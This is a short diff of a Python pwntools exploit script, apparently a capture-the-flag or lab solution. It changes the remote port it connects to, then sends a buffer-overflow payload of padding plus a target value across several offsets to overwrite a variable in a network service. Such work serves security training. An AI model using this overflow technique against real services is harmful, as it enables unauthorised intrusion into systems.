@@ -6,7 +6,7 @@ target_value = b"\x63\x79\x73\x65\x63\x3a\x29\xff"
 # Try offsets from 300 to 316 to handle compiler positioning of customer_id
 for offset in range(300, 320, 4):
     try:
-        io = pwn.remote('10.21.232.223', 58852)
+        io = pwn.remote('10.21.232.223', 41492)
         io.sendlineafter(b"Enter you Customer ID : ", b"1")
         
         payload = b"A" * offset + target_value
